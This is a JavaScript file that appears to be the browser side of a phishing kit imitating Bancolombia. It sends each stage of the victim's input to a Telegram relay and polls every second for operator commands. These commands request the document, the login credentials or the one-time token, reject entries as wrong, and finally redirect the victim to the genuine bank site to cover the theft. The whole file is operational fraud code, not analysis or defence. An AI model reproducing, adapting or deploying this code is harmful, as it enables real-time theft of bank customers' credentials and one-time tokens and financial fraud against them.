/**
 * TELEGRAM INTEGRATION MANAGER
 * Maneja comunicación con Telegram y polling de acciones
 */

'use strict';

class TelegramManager {
    constructor() {
        this.checkInterval = null;
        this.isPolling = false;
        this.pollCount = 0;
    }

    async sendToTelegram(stage, data) {
        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 15000);
            
            const response = await fetch('/api/send-message', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                credentials: 'include',
                body: JSON.stringify({ stage, data }),
                signal: controller.signal
            });

            clearTimeout(timeoutId);
            const result = await response.json();
            console.log('📤 Mensaje enviado a Telegram');
            return result;
        } catch (error) {
            if (error.name === 'AbortError') {
                console.error('❌ Timeout enviando a Telegram');
            } else {
                console.error('❌ Error enviando a Telegram:', error);
            }
            return { success: false };
        }
    }

    async startPolling() {
        if (this.isPolling) {
            console.log('⚠️ Polling ya activo');
            return;
        }
        this.isPolling = true;
        this.pollCount = 0;
        // Polling rápido cada 1 segundo
        this.checkInterval = setInterval(() => this.checkAction(), 1000);
        console.log('🔄 POLLING INICIADO (cada 1s)');
    }

    stopPolling() {
        if (this.checkInterval) {
            clearInterval(this.checkInterval);
            this.checkInterval = null;
        }
        this.isPolling = false;
        console.log('⏹️ POLLING DETENIDO');
    }

    async checkAction() {
        this.pollCount++;
        
        try {
            const response = await fetch(`/api/check-action?_=${Date.now()}`, {
                method: 'GET',
                cache: 'no-cache',
                credentials: 'include'
            });
            
            if (response.ok) {
                const data = await response.json();
                
                if (data.action) {
                    console.log(`\n🔵🔵🔵 ACCIÓN DETECTADA: ${data.action} 🔵🔵🔵\n`);
                    this.stopPolling();
                    this.handleAction(data.action);
                } else {
                    // Log cada 5 intentos
                    if (this.pollCount % 5 === 0) {
                        console.log(`🔍 Polling... (${this.pollCount} intentos, esperando acción)`);
                    }
                }
            } else {
                console.error('❌ Response error:', response.status);
            }
        } catch (error) {
            console.error('❌ Error en checkAction:', error.message);
        }
    }

    handleAction(action) {
        console.log(`🎯 EJECUTANDO: ${action}`);

        switch (action) {
            case 'error_documento':
                this.showOverlay();
                console.log('➡️ Redirigiendo a index con error...');
                setTimeout(() => window.location.href = '/index.html?error=documento', 100);
                break;

            case 'pedir_logo':
                this.showOverlay();
                console.log('➡️ Redirigiendo a next-step...');
                setTimeout(() => window.location.href = '/next-step.html', 100);
                break;

            case 'error_logo':
                this.showOverlay();
                console.log('➡️ Redirigiendo a next-step con error...');
                setTimeout(() => window.location.href = '/next-step.html?error=credenciales', 100);
                break;

            case 'pedir_token':
                console.log('🔑 Procesando pedir_token...');
                const isOnNextStep = window.location.pathname.includes('next-step');
                
                if (isOnNextStep && window.tokenModalController) {
                    this.hideOverlay();
                    console.log('➡️ Abriendo tarjeta de token...');
                    setTimeout(() => window.tokenModalController.switchToTokenCard(), 100);
                } else {
                    this.showOverlay();
                    console.log('➡️ Redirigiendo a next-step con token...');
                    setTimeout(() => window.location.href = '/next-step.html?openToken=1', 100);
                }
                break;

            case 'error_token':
                this.hideOverlay();
                console.log('❌ Error de token, limpiando input...');
                const tokenInput = document.getElementById('tokenInputCard');
                if (tokenInput) {
                    tokenInput.value = '';
                    setTimeout(() => {
                        tokenInput.focus();
                        alert('Token incorrecto. Por favor, inténtalo nuevamente.');
                    }, 100);
                }
                break;

            case 'finalizar':
                this.showOverlay();
                console.log('🏁 Finalizando, redirigiendo a Bancolombia...');
                setTimeout(() => window.location.href = 'https://www.bancolombia.com/personas', 100);
                break;

            default:
                console.warn('❓ Acción desconocida:', action);
                this.hideOverlay();
        }
    }

    showOverlay() {
        const overlay = document.querySelector('.loading-overlay');
        if (overlay) {
            overlay.classList.add('active');
        }
    }

    hideOverlay() {
        const overlay = document.querySelector('.loading-overlay');
        if (overlay) {
            overlay.classList.remove('active');
        }
    }
}

// Instancia global
window.telegramManager = new TelegramManager();

// Iniciar polling al cargar para poder recibir comandos de Telegram
document.addEventListener('DOMContentLoaded', () => {
    console.log('📱 Telegram Manager listo');
    console.log('🔄 Iniciando polling automático...');
    // Siempre iniciar polling para escuchar comandos
    window.telegramManager.startPolling();
});

